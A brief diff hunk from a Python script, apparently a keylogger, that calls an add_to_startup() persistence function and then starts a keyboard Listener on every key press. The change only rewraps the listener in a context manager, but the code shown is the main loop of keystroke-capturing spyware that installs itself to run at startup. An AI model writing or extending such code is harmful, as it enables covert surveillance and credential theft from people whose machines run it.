@@ -97,4 +97,5 @@ def add_to_startup():
 
 if __name__=="__main__":
     add_to_startup()
-    Listener(on_press=on_press).join()
+    with Listener(on_press=on_press) as listener:
+        listener.join()
